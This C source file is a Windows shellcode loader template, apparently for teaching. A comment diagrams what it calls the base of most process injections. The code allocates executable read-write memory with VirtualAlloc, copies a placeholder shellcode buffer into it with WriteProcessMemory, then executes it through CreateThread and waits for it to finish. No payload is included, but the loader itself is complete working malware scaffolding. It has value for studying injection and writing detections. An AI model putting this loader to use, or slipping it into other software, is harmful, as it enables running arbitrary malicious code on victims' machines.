#include <windows.h>

/* 
*                            This is the base of (almost)all injections
* |----------------------------------------------------------------------------------------------
* |                                                                                             |
* | Allocate memory(VirutalAlloc) -> Write Shellcode onto it(WriteProcessMemory)                |
* |                                                                  |                          |
* |                                                                  |                          |
* | close the thread <---Wait to finish this thread<---Create a new Thread under that process   |
* |    (CloseHandle)         (WaitForSingleObject)             (CreateThread)                   |
* |                                                                                             |
* |---------------------------------------------------------------------------------------------|
*/

int main() {
  unsigned char shellcode[] = "..."; // our shellcode goes here

  // Allocating memory
  LPVOID hMemory =
      VirtualAlloc(NULL,              // We dont care where it is located on
                   sizeof(shellcode), // Size of mem to reserve
                   MEM_COMMIT | MEM_RESERVE, // Type of memory location
                   PAGE_EXECUTE_READWRITE);  // Memory protection

  // Write onto memory
  SIZE_T bytesWritten = 0;
  WriteProcessMemory(GetCurrentProcess(), // handle to the target process
                     hMemory,             // handle to target mem region
                     &shellcode,          // pointer to data to write
                     sizeof(shellcode),   // size of data to write
                     &bytesWritten // receives the number of bytes written
  );

  // Create a new thread
  DWORD threadId = 0;
  HANDLE hThread = CreateThread(
      NULL, 0,
      (LPTHREAD_START_ROUTINE)
          hMemory, // Pointer to the routine that we want to execute
      NULL, 0,
      &threadId // Receives the new thread id
  );

  // wait to the thread to finish
  WaitForSingleObject(hThread, INFINITE);

  // Close thread handle
  CloseHandle(hThread);
}
